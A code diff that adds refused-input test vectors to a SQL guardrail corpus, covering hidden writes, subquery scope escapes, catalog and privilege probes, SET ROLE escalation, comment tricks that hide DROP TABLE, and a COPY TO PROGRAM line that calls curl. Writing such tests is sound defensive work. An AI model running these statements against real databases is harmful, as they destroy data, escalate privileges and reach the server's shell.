@@ -118,6 +118,36 @@ CASES: list[Case] = [
     Case("integrity", "SELECT pg_sleep(10)", guardrail.RULE_READ_ONLY, "sleep-fn"),
     Case("integrity", "SELECT id FROM orders FOR UPDATE", guardrail.RULE_READ_ONLY, "row-lock"),
     Case("integrity", "SELECT id INTO x FROM orders", guardrail.RULE_READ_ONLY, "select-into"),
+    # The rest of the write surface. `DELETE`/`UPDATE`/`DROP`/`INSERT` above are the DML a reader
+    # thinks of first; these are the statement classes a grant that stopped DML would leave open —
+    # bulk removal, schema creation, schema change, privilege change, the prepared-statement
+    # stacking path, and transaction control. Each is refused by `check_read_only`, some at the
+    # opening-keyword step and some at the deny-list, and the corpus does not care which: what it
+    # pins is that the caller cannot write, whatever spelling the write arrives in.
+    Case("integrity", "TRUNCATE TABLE orders", guardrail.RULE_READ_ONLY, "truncate"),
+    Case(
+        "integrity",
+        "CREATE TABLE stash AS SELECT id, amount FROM orders",
+        guardrail.RULE_READ_ONLY,
+        "create-table-as-select",
+    ),
+    Case(
+        "integrity",
+        "ALTER TABLE orders ADD COLUMN note TEXT",
+        guardrail.RULE_READ_ONLY,
+        "alter",
+    ),
+    Case("integrity", "GRANT SELECT ON orders TO PUBLIC", guardrail.RULE_READ_ONLY, "grant"),
+    Case("integrity", "REVOKE SELECT ON orders FROM PUBLIC", guardrail.RULE_READ_ONLY, "revoke"),
+    Case(
+        "integrity",
+        "PREPARE p AS SELECT id FROM orders",
+        guardrail.RULE_READ_ONLY,
+        "prepare",
+    ),
+    Case("integrity", "EXECUTE p", guardrail.RULE_READ_ONLY, "execute"),
+    Case("integrity", "BEGIN", guardrail.RULE_READ_ONLY, "begin"),
+    Case("integrity", "ROLLBACK", guardrail.RULE_READ_ONLY, "rollback"),
     # ── class 2a: object scope — an undeclared table → table_scope ──────────────────────────────
     Case("table_scope", "SELECT id FROM secret_table", guardrail.RULE_TABLE_SCOPE, "undeclared"),
     Case(
@@ -138,6 +168,28 @@ CASES: list[Case] = [
         guardrail.RULE_TABLE_SCOPE,
         "except-arm",
     ),
+    # The reach hidden BELOW the top level. The set-op arms above are the visible half; a subquery
+    # and a CTE body are the half a gate that only walked the outermost SELECT would miss entirely,
+    # and the outer statement here is a perfectly governed one. Both scope gates walk `find_all`
+    # over the whole tree, so these are refused — they were simply never proved end to end.
+    Case(
+        "table_scope",
+        "SELECT id FROM orders WHERE customer_id IN (SELECT id FROM secret_table)",
+        guardrail.RULE_TABLE_SCOPE,
+        "in-subquery",
+    ),
+    Case(
+        "table_scope",
+        "SELECT id FROM orders WHERE amount > (SELECT MAX(amount) FROM secret_table)",
+        guardrail.RULE_TABLE_SCOPE,
+        "scalar-subquery",
+    ),
+    Case(
+        "table_scope",
+        "WITH t AS (SELECT id FROM secret_table) SELECT id FROM t",
+        guardrail.RULE_TABLE_SCOPE,
+        "cte-body-table",
+    ),
     # ── class 2b: SELECT * → select_star (incl. hidden in a set-op arm) ─────────────────────────
     # `undetermined`, not `out_of_scope`: a star is not a reach, it is an inability to decide
     # whether there is one, because resolving `*` to a column list needs a catalog the guard does
@@ -149,6 +201,19 @@ CASES: list[Case] = [
         "SELECT id FROM orders UNION SELECT * FROM customers",
         guardrail.RULE_SELECT_STAR,
         "set-op-arm-star",
+    ),
+    # The star one level down, where the outer projection names its columns and looks governed.
+    Case(
+        "select_star",
+        "WITH t AS (SELECT * FROM orders) SELECT id FROM t",
+        guardrail.RULE_SELECT_STAR,
+        "cte-body-star",
+    ),
+    Case(
+        "select_star",
+        "SELECT id FROM (SELECT * FROM orders) AS sub",
+        guardrail.RULE_SELECT_STAR,
+        "subquery-star",
     ),
     # ── class 2c: an undeclared column → column_scope ───────────────────────────────────────────
     Case(
@@ -162,6 +227,19 @@ CASES: list[Case] = [
         "SELECT id FROM orders UNION SELECT bogus FROM customers",
         guardrail.RULE_COLUMN_SCOPE,
         "set-op-arm-col",
+    ),
+    # The same descent as the table-scope pair above, on the column gate.
+    Case(
+        "column_scope",
+        "SELECT id FROM orders WHERE customer_id IN (SELECT bogus FROM customers)",
+        guardrail.RULE_COLUMN_SCOPE,
+        "in-subquery-col",
+    ),
+    Case(
+        "column_scope",
+        "WITH t AS (SELECT bogus FROM customers) SELECT bogus FROM t",
+        guardrail.RULE_COLUMN_SCOPE,
+        "cte-body-col",
     ),
     # ── class 3: fail-closed scopability → unscopable ───────────────────────────────────────────
     # The rule has TWO producers, deliberately: `runtime.check_readable` refuses a statement that
@@ -186,6 +264,54 @@ CASES: list[Case] = [
         guardrail.RULE_UNSCOPABLE,
         "comma-join-values",
     ),
+    # The two other shapes `check_scopable`'s own docstring names and no vector tried: a source that
+    # is neither a table nor a derived subquery, and a lateral. Both parse perfectly and both offer
+    # the scope walk nothing to accept or reject, which is the whole reason the gate is separate
+    # from `check_readable`.
+    # The UNNEST source is written WITHOUT an array literal on purpose, and the reason is worth the
+    # lines. `SELECT o.id FROM orders o CROSS JOIN UNNEST(ARRAY[1, 2]) AS t(x)` — the spelling that
+    # reads most naturally — is refused `unscopable` on the Postgres path and `unparseable` on the
+    # SQLite one. Both are correct and neither is a defect: SQLite has no array type, sqlglot cannot
+    # read `ARRAY[…]` in that grammar, and a statement the resolved grammar cannot read is refused
+    # by the gate above this one, fail-closed, before the gate this vector is about ever sees it.
+    # Measured on both paths rather than reasoned about.
+    #
+    # It is not carried as a second engine-pinned vector because the identical-verdicts test runs
+    # every DB-path vector on BOTH paths, so a Postgres-only vector would be asserting that the two
+    # paths agree about a statement one of them cannot parse. The literal form below parses on both
+    # engines and presents the same `exp.Unnest` source, so the same gate answers on both — which is
+    # what the vector is for.
+    #
+    # A declared table LEADS the join for a second reason: `check_readable`'s backstop refuses a
+    # statement that resolves to no named table at all, and it answers first for a bare UNNEST —
+    # `unscopable` either way, but from the wrong gate. With `orders` in front the backstop is
+    # satisfied and `check_scopable`'s UNNEST arm is the only gate left, which the refusal's own
+    # detail confirms.
+    Case(
+        "unscopable",
+        "SELECT o.id FROM orders o CROSS JOIN UNNEST('a,b') AS t(x)",
+        guardrail.RULE_UNSCOPABLE,
+        "unnest",
+    ),
+    Case(
+        "unscopable",
+        "SELECT o.id FROM orders o JOIN LATERAL (SELECT 1 AS x) AS l ON TRUE",
+        guardrail.RULE_UNSCOPABLE,
+        "lateral",
+    ),
+    # ── class 3b: parser divergence → unparseable ───────────────────────────────────────────────
+    # The canonical bypass class for this architecture: the guard reads a statement one way and the
+    # engine another, so a statement neither can agree on must not be executed on the strength of
+    # whichever read happened to be permissive. `unparseable` had two live producers and no vector,
+    # and the shape test could not notice because it compared the corpus's rules as a SUBSET of the
+    # pinned ones. It is an equality now, with an explicit exemption list.
+    Case("unparseable", "SELECT FROM WHERE", guardrail.RULE_UNPARSEABLE, "keyword-soup"),
+    Case(
+        "unparseable",
+        "SELECT id FROM orders WHERE (",
+        guardrail.RULE_UNPARSEABLE,
+        "unclosed-paren",
+    ),
     # ── class 4: recon / metadata ───────────────────────────────────────────────────────────────
     # The attack class is one thing and the rule that stops it is two, deliberately. The recon
     # deny-list is FUNCTIONS only; a catalog RELATION is a table the model does not declare, which
@@ -204,6 +330,20 @@ CASES: list[Case] = [
         "SELECT relname FROM pg_catalog.pg_class",
         guardrail.RULE_TABLE_SCOPE,
         "pg_catalog",
+    ),
+    # The existence oracle, which is the one recon shape that survives every scope gate: the cast
+    # errors when the object is absent and answers "does this exist?" without ever naming the object
+    # in a FROM clause, so a fully-scoped statement carries it past table scope untouched.
+    # `sql_guard.py` says exactly that about itself, and nothing tested it end to end.
+    Case("recon", "SELECT 'orders'::regclass", guardrail.RULE_RECON, "regclass-cast"),
+    Case("recon", "SELECT to_regclass('orders')", guardrail.RULE_RECON, "to-regclass"),
+    # The privilege probe: what the caller is asking is not about the data but about the ROLE the
+    # server connects as, which is the reconnaissance step before an escalation attempt.
+    Case(
+        "recon",
+        "SELECT has_table_privilege('orders', 'SELECT')",
+        guardrail.RULE_RECON,
+        "privilege-probe",
     ),
     # ── class 5: availability — a result over the deployment ceiling → resource_limit ───────────
     # The truncate-and-flag arm is deleted: an over-ceiling result is REFUSED and carries no data,
@@ -229,6 +369,12 @@ CASES: list[Case] = [
         "join-aggregate",
     ),
     Case("governed", "SELECT COUNT(email) AS n FROM customers", None, "sensitive-in-count-ok"),
+    # A raw sensitive column PROJECTED, not counted. The distinction is the whole of ACE-094: a
+    # `sensitive` flag is a model fact the receipt reports, never a gate, so reading the column has
+    # to come back `ok`. The only vector pinning that was the backtick-quoted one below, which is
+    # pinned to SQLite — so the DB path, the one that runs against a real warehouse under the
+    # least-privilege role, never exercised raw sensitive projection at all.
+    Case("governed", "SELECT email FROM customers", None, "sensitive-projection"),
     # ── class 8: the same verdicts when the statement is written in the engine's own quoting ────
     # A statement read in the wrong grammar does not describe itself: under a generic parse a
     # backtick-quoted statement resolves to no tables and no columns, so every scope gate finds
@@ -341,6 +487,15 @@ CASES: list[Case] = [
     # a pooled connection. Neither is an analytics primitive.
     Case("session", "SELECT id FROM orders; COMMIT", guardrail.RULE_READ_ONLY, "tcl-commit"),
     Case("session", "SET ROLE postgres", guardrail.RULE_READ_ONLY, "escalate-via-set"),
+    # The classic Postgres OS escape, and the one this class was missing: `pg_read_file` reaches the
+    # server's filesystem and `COPY … TO PROGRAM` reaches its SHELL, which is a strictly larger
+    # capability than anything else in this class.
+    Case(
+        "file_fn",
+        "COPY orders TO PROGRAM 'curl https://example.com'",
+        guardrail.RULE_READ_ONLY,
+        "copy-to-program",
+    ),
     # The line comment swallows the statement separator, so a splitter that trusts `;` sees ONE
     # statement — the keyword check reads what is actually there and still refuses.
     Case(
@@ -348,6 +503,30 @@ CASES: list[Case] = [
         "SELECT id FROM orders -- ;\nDROP TABLE orders",
         guardrail.RULE_READ_ONLY,
         "line-comment-hides-separator",
+    ),
+    # The three comment forms the neutralizer refuses outright rather than blanking, because the
+    # engines genuinely disagree about what they mean. The vector above is the OTHER half of the
+    # class — a well-formed comment whose body the keyword check reads anyway — and only that half
+    # was tested. `/*! … */` is executed by MySQL, `#` is a comment there and an operator in
+    # Postgres, and a bare `--x` is a comment in Postgres and an operator in MySQL. A lexer with no
+    # dialect cannot pick, so it refuses, and that refusal is what these pin.
+    Case(
+        "comment",
+        "SELECT id FROM orders /*! ; DROP TABLE orders */",
+        guardrail.RULE_READ_ONLY,
+        "mysql-executable-comment",
+    ),
+    Case(
+        "comment",
+        "SELECT id FROM orders # ;\nDROP TABLE orders",
+        guardrail.RULE_READ_ONLY,
+        "hash-comment",
+    ),
+    Case(
+        "comment",
+        "SELECT id FROM orders --;\nDROP TABLE orders",
+        guardrail.RULE_READ_ONLY,
+        "bare-line-comment",
     ),
     # Data-modifying CTEs: the statement opens with WITH (allowed) and the write hides in the body.
     Case(
@@ -381,18 +560,33 @@ DB_PATH_ENGINE = "PostgreSQL"
 # `CASES` cannot be renamed out of existence — it can only be wrong, loudly.
 EXPECTED_DB_VECTORS = len([case for case in CASES if case.runs_on(DB_PATH_ENGINE)])
 
+# The same number for the FILE path — the half that runs on every PR — and it closes the same hole
+# one level up. The DB-vector count makes a thinned parametrization visible; it does nothing about a
+# run that keeps the whole DB half and drops `test_safety_corpus.py` entirely, which is one
+# `--deselect` (or one deleted file) and was worth exactly zero to notice. The driver's
+# parametrizer marks its items, `tests/e2e/conftest.py` counts them, and a declared run that
+# collects a different number ends red.
+EXPECTED_HTTP_VECTORS = len([case for case in CASES if case.runs_on(FILE_PATH_ENGINE)])
 
-# The stdio bound, derived from `CASES` so it cannot be restated wrong. The stdio route spawns a
-# process per call, so driving the whole corpus on it is ~56 subprocess spawns on the critical path
-# of every PR; what stdio is there to prove is that the chokepoint's verdict does not depend on the
-# transport, and one vector per distinct rule proves exactly that. The read-only class is carried
-# whole because it is the largest attack surface and its vectors take different paths INTO the same
-# gate (keyword, comment-hidden separator, CTE body), which is a difference a single representative
-# would hide. `None` counts as a distinct rule, so a governed vector rides along and the subset
-# cannot pass by refusing everything.
+
+# The stdio bound, derived from `CASES` so it cannot be restated wrong, and stated HERE ONLY. It was
+# derived three different ways in three places, two of them wrong: only the stdio route spawns a
+# process — the HTTP route it is compared against runs in-process — so the cost of the transport
+# dimension is `STDIO_SPAWNS` child processes, not twice that.
+#
+# What stdio is there to prove is that the chokepoint's verdict does not depend on the transport,
+# and one vector per distinct rule proves exactly that. The read-only class is carried whole because
+# it is the largest attack surface and its vectors take genuinely different paths INTO the same gate
+# (bare keyword, deny-listed keyword, dangerous function, comment-hidden separator, a comment form
+# the lexer refuses outright, CTE body), which is a difference a single representative would hide.
+# `None` counts as a distinct rule, so a governed vector rides along and the subset cannot pass by
+# refusing everything.
 STDIO_SUBSET: list[Case] = [
     case
     for index, case in enumerate(CASES)
     if case.rule == guardrail.RULE_READ_ONLY
     or index == next(i for i, c in enumerate(CASES) if c.rule == case.rule)
 ]
+
+# One child process per subset vector, and the only statement of that number anywhere.
+STDIO_SPAWNS = len(STDIO_SUBSET)
